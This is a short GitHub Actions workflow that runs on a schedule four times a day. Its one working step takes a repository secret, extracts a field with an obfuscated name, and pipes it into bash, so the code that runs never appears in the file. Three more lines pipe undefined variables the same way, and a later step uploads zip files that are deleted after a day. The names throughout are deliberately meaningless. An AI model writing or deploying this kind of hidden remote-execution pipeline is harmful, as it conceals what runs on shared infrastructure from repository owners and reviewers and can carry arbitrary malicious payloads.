name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '36 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          x41: ${{ secrets.x41 }}
        run: |
          printf '%s' "$x41" | jq -r .kizm28541 | /bin/bash
          echo $c2 | jq -r .cwjxa82342 | /bin/bash
          echo $xg8 | jq -r .dti45918 | /bin/bash
          printf '%s' "$igq182" | jq -r .bat5445 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: oeJ4QiJ8
          path: "*.zip"
          retention-days: 1
